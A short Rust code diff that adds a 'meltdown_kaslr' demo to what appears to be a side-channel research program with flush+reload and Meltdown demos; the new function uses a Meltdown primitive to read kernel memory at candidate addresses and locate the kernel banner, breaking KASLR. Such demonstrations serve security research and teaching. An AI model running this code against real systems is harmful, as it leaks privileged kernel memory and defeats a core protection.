@@ -21,6 +21,7 @@ fn main() {
     match args.task.to_lowercase().trim() {
         "flush+reload" => flush_reload_demo(),
         "meltdown" => meltdown_demo(),
+        "meltdown_kaslr" => meltdown_kaslr_demo(),
         _ => {}
     }
 }
@@ -50,4 +51,19 @@ fn meltdown_demo() {
         read_byte.unwrap(),
         secret_byte
     );
+}
+
+fn meltdown_kaslr_demo() {
+    let start_range = 0xffff_ffff_8100_0000u64;
+    let end_range = 0xffff_ffff_8200_0000u64;
+    let banner_offset = 0xc00180u64;
+
+    let meltdown_attack = MeltdownUS::new();
+    for addr in (start_range + banner_offset..end_range + banner_offset).step_by(0x200_000) {
+        let addr = addr as *const u8;
+        let potential_banner = (0..5)
+            .map(|i| meltdown_attack.read(unsafe { addr.add(i) }))
+            .collect::<Vec<_>>();
+        println!("Potential banner: {:?}", potential_banner);
+    }
 }
